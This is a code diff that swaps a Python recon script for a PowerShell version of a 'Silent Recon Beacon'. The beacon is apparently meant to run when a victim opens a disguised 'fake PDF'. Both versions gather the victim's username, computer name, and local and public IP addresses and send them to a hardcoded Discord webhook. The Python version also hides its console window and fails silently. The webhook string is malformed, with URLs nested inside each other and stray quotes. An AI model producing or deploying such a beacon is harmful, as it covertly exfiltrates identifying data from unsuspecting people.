@@ -1,41 +1,20 @@
-# spy_pdf.py - Silent Recon Beacon
-import requests
-import os
-import socket
-import time
-import ctypes
-import sys
+# report.ps1 - Silent Recon Beacon (PowerShell Only)
+$webhook = "https://discord.com/api/webhooks/"https://discord.com/api/webhooks/https://discordapp.com/api/webhooks/1547609479242326016/XUwdWXwfxnJFELuClPeFiTWLqti8o4o86gVD6y8fRk2uzBwq8du5t58L3uMZ7WlN_wA4""  # ← Jouw webhook
 
-# === ⚠️ CHANGE THIS TO YOUR DISCORD WEBHOOK ===
-WEBHOOK = "https://discord.com/api/webhooks/https://discordapp.com/api/webhooks/1547609479242326016/XUwdWXwfxnJFELuClPeFiTWLqti8o4o86gVD6y8fRk2uzBwq8du5t58L3uMZ7WlN_wA4"  # ← PASTE YOUR LINK HERE
+$user = $env:USERNAME
+$pc = $env:COMPUTERNAME
+$ip = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
+try { $public = (Invoke-WebRequest -uri "https://ifconfig.me" -TimeoutSec 5).Content } catch { $public = "Unknown" }
 
-# Hide console window
-ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+$msg = @"
+**🎯 Fake PDF Opened!**
+**User:** $user
+**PC:** $pc
+**Local IP:** $ip
+**Public IP:** $public
+**Time:** $(Get-Date)
+"@
 
-def main():
-    try:
-        user = os.getlogin()
-        pc = socket.gethostname()
-        ip = socket.gethostbyname(pc)
-        try:
-            public_ip = requests.get("https://ifconfig.me", timeout=5).text
-        except:
-            public_ip = "Unknown"
-
-        msg = f"""
-**🎯 Fake PDF Opened!**  
-**User:** {user}
-**PC:** {pc}
-**Local IP:** {ip}
-**Public IP:** {public_ip}
-**Time:** {time.ctime()}
-**Script:** spy_pdf.py
-        """
-
-        requests.post(WEBHOOK, json={"content": msg}, timeout=10)
-    except:
-        pass  # Silent fail
-    sys.exit()
-
-if __name__ == "__main__":
-    main()
+try {
+    Invoke-RestMethod -Uri $webhook -Method POST -Body "{`"content`":`"$msg`"}" -ContentType 'application/json'
+} catch {}
